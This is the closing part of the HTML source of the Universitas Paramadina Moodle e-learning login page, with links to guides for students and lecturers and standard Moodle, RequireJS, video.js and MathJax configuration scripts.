                                                            <li><a href="https://bit.ly/panduan-elearning-mhs" title="">Panduan Elearning Mahasiswa</a></li>
                                                            <li><a href="https://bit.ly/gsuite-mhs" title="">Panduan GSuite Mahasiswa Angkatan 2020 Kebawah</a></li>
                                                            <li><a href="https://bit.ly/GSuite-mhs2021" title="">Panduan GSuite Mahasiswa Angkatan Baru 20-21</a></li>
                                                            <li><a href="https://bit.ly/Gsuite-DLB" title="">Panduan GSuite DLB</a></li>
                                                            <li><a href="http://bit.ly/recovery-password-GSuite" title="">Panduan Recovery Password G Suite</a></li>
                                                            <li><a href="https://bit.ly/gmail-hp" title="">Panduan Akses GSuite via Perangkat Pintar</a></li>
                                                            <li><a href="https://bit.ly/Import-Zimbra" title="">Panduan Import Email Zimbra ke Email Gsuite</a></li>
                                                            <li><a href="https://bit.ly/Myparmad-mhs" title="">Panduan Myparmad Mahasiswa</a></li>
                                                            <li><a href="https://bit.ly/Myparmad-dsn" title="">Panduan Myparmad Dosen</a></li>
                                                            <li><a href="http://bit.ly/lapor-poin" title="">Panduan Lapor Poin Mahasiswa via Myparmad</a></li>
                                                            <li><a href="https://bit.ly/G-meet" title="">Panduan Google Meet</a></li>
                                        </ul>
                                    </li>
                                        <li><a href="#" title="Language">English ‎(en)‎</a></li>
                                    <li>
                                        <ul class="list-unstyled ml-3">
                                                            <li><a href="https://elearning.paramadina.ac.id/login/index.php?lang=en" title="English ‎(en)‎">English ‎(en)‎</a></li>
                                                            <li><a href="https://elearning.paramadina.ac.id/login/index.php?lang=id" title="Indonesian ‎(id)‎">Indonesian ‎(id)‎</a></li>
                                        </ul>
                                    </li>
                    </ul>
            </nav>
            <div id="theme_switch_link"><a rel="nofollow" href="https://elearning.paramadina.ac.id/theme/switchdevice.php?url=https%3A%2F%2Felearning.paramadina.ac.id%2Flogin%2Findex.php&amp;device=default&amp;sesskey=h64v6SMJtY">Switch to the standard theme</a></div>
            
<br><p align="center"><strong>Divisi Teknologi Informasi Universitas Paramadina<br>2020</strong></p><script>
//<![CDATA[
var require = {
    baseUrl : 'https://elearning.paramadina.ac.id/lib/requirejs.php/1612752544/',
    // We only support AMD modules with an explicit define() statement.
    enforceDefine: true,
    skipDataMain: true,
    waitSeconds : 0,

    paths: {
        jquery: 'https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/jquery/jquery-3.4.1.min',
        jqueryui: 'https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/jquery/ui-1.12.1/jquery-ui.min',
        jqueryprivate: 'https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/requirejs/jquery-private'
    },

    // Custom jquery config map.
    map: {
      // '*' means all modules will get 'jqueryprivate'
      // for their 'jquery' dependency.
      '*': { jquery: 'jqueryprivate' },
      // Stub module for 'process'. This is a workaround for a bug in MathJax (see MDL-60458).
      '*': { process: 'core/first' },

      // 'jquery-private' wants the real jQuery module
      // though. If this line was not here, there would
      // be an unresolvable cyclic dependency.
      jqueryprivate: { jquery: 'jquery' }
    }
};

//]]>
</script>
<script src="https://elearning.paramadina.ac.id/lib/javascript.php/1612752544/lib/requirejs/require.min.js"></script>
<script>
//<![CDATA[
M.util.js_pending("core/first");require(['core/first'], function() {
require(['core/prefetch']);
;
require(["media_videojs/loader"], function(loader) {
    loader.setUp(function(videojs) {
        videojs.options.flash.swf = "https://elearning.paramadina.ac.id/media/player/videojs/videojs/video-js.swf";
videojs.addLanguage('en', {
  "Audio Player": "Audio Player",
  "Video Player": "Video Player",
  "Play": "Play",
  "Pause": "Pause",
  "Replay": "Replay",
  "Current Time": "Current Time",
  "Duration": "Duration",
  "Remaining Time": "Remaining Time",
  "Stream Type": "Stream Type",
  "LIVE": "LIVE",
  "Seek to live, currently behind live": "Seek to live, currently behind live",
  "Seek to live, currently playing live": "Seek to live, currently playing live",
  "Loaded": "Loaded",
  "Progress": "Progress",
  "Progress Bar": "Progress Bar",
  "progress bar timing: currentTime={1} duration={2}": "{1} of {2}",
  "Fullscreen": "Fullscreen",
  "Non-Fullscreen": "Non-Fullscreen",
  "Mute": "Mute",
  "Unmute": "Unmute",
  "Playback Rate": "Playback Rate",
  "Subtitles": "Subtitles",
  "subtitles off": "subtitles off",
  "Captions": "Captions",
  "captions off": "captions off",
  "Chapters": "Chapters",
  "Descriptions": "Descriptions",
  "descriptions off": "descriptions off",
  "Audio Track": "Audio Track",
  "Volume Level": "Volume Level",
  "You aborted the media playback": "You aborted the media playback",
  "A network error caused the media download to fail part-way.": "A network error caused the media download to fail part-way.",
  "The media could not be loaded, either because the server or network failed or because the format is not supported.": "The media could not be loaded, either because the server or network failed or because the format is not supported.",
  "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.": "The media playback was aborted due to a corruption problem or because the media used features your browser did not support.",
  "No compatible source was found for this media.": "No compatible source was found for this media.",
  "The media is encrypted and we do not have the keys to decrypt it.": "The media is encrypted and we do not have the keys to decrypt it.",
  "Play Video": "Play Video",
  "Close": "Close",
  "Close Modal Dialog": "Close Modal Dialog",
  "Modal Window": "Modal Window",
  "This is a modal window": "This is a modal window",
  "This modal can be closed by pressing the Escape key or activating the close button.": "This modal can be closed by pressing the Escape key or activating the close button.",
  ", opens captions settings dialog": ", opens captions settings dialog",
  ", opens subtitles settings dialog": ", opens subtitles settings dialog",
  ", opens descriptions settings dialog": ", opens descriptions settings dialog",
  ", selected": ", selected",
  "captions settings": "captions settings",
  "subtitles settings": "subtitles settings",
  "descriptions settings": "descriptions settings",
  "Text": "Text",
  "White": "White",
  "Black": "Black",
  "Red": "Red",
  "Green": "Green",
  "Blue": "Blue",
  "Yellow": "Yellow",
  "Magenta": "Magenta",
  "Cyan": "Cyan",
  "Background": "Background",
  "Window": "Window",
  "Transparent": "Transparent",
  "Semi-Transparent": "Semi-Transparent",
  "Opaque": "Opaque",
  "Font Size": "Font Size",
  "Text Edge Style": "Text Edge Style",
  "None": "None",
  "Raised": "Raised",
  "Depressed": "Depressed",
  "Uniform": "Uniform",
  "Dropshadow": "Dropshadow",
  "Font Family": "Font Family",
  "Proportional Sans-Serif": "Proportional Sans-Serif",
  "Monospace Sans-Serif": "Monospace Sans-Serif",
  "Proportional Serif": "Proportional Serif",
  "Monospace Serif": "Monospace Serif",
  "Casual": "Casual",
  "Script": "Script",
  "Small Caps": "Small Caps",
  "Reset": "Reset",
  "restore all settings to the default values": "restore all settings to the default values",
  "Done": "Done",
  "Caption Settings Dialog": "Caption Settings Dialog",
  "Beginning of dialog window. Escape will cancel and close the window.": "Beginning of dialog window. Escape will cancel and close the window.",
  "End of dialog window.": "End of dialog window.",
  "{1} is loading.": "{1} is loading.",
  "Exit Picture-in-Picture": "Exit Picture-in-Picture",
  "Picture-in-Picture": "Picture-in-Picture"
});

    });
});;

require(['jquery', 'core/custom_interaction_events'], function($, CustomEvents) {
    CustomEvents.define('#single_select6063f309746763', [CustomEvents.events.accessibleChange]);
    $('#single_select6063f309746763').on(CustomEvents.events.accessibleChange, function() {
        var ignore = $(this).find(':selected').attr('data-ignore');
        if (typeof ignore === typeof undefined) {
            $('#single_select_f6063f309746762').submit();
        }
    });
});
;

require(['theme_boost/loader']);
;

        require(['jquery'], function($) {
            $('#loginerrormessage').focus();
        });
;
M.util.js_pending('core/notification'); require(['core/notification'], function(amd) {amd.init(1, [], false); M.util.js_complete('core/notification');});;
M.util.js_pending('core/log'); require(['core/log'], function(amd) {amd.setConfig({"level":"warn"}); M.util.js_complete('core/log');});;
M.util.js_pending('core/page_global'); require(['core/page_global'], function(amd) {amd.init(); M.util.js_complete('core/page_global');});M.util.js_complete("core/first");
});
//]]>
</script>
<script>
//<![CDATA[
M.str = {"moodle":{"lastmodified":"Last modified","name":"Name","error":"Error","info":"Information","yes":"Yes","no":"No","cancel":"Cancel","confirm":"Confirm","areyousure":"Are you sure?","closebuttontitle":"Close","unknownerror":"Unknown error","file":"File","url":"URL"},"repository":{"type":"Type","size":"Size","invalidjson":"Invalid JSON string","nofilesattached":"No files attached","filepicker":"File picker","logout":"Logout","nofilesavailable":"No files available","norepositoriesavailable":"Sorry, none of your current repositories can return files in the required format.","fileexistsdialogheader":"File exists","fileexistsdialog_editor":"A file with that name has already been attached to the text you are editing.","fileexistsdialog_filemanager":"A file with that name has already been attached","renameto":"Rename to \"{$a}\"","referencesexist":"There are {$a} alias\/shortcut files that use this file as their source","select":"Select"},"admin":{"confirmdeletecomments":"You are about to delete comments, are you sure?","confirmation":"Confirmation"},"debug":{"debuginfo":"Debug info","line":"Line","stacktrace":"Stack trace"},"langconfig":{"labelsep":": "}};
//]]>
</script>
<script>
//<![CDATA[
(function() {Y.use("moodle-filter_mathjaxloader-loader",function() {M.filter_mathjaxloader.configure({"mathjaxconfig":"\nMathJax.Hub.Config({\n    config: [\"Accessible.js\", \"Safe.js\"],\n    errorSettings: { message: [\"!\"] },\n    skipStartupTypeset: true,\n    messageStyle: \"none\"\n});\n","lang":"en"});
});
M.util.help_popups.setup(Y);
 M.util.js_pending('random6063f309746764'); Y.on('domready', function() { M.util.js_complete("init");  M.util.js_complete('random6063f309746764'); });
})();
//]]>
</script>

    
        </div>
    
    </footer>
</div><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>


</body></html>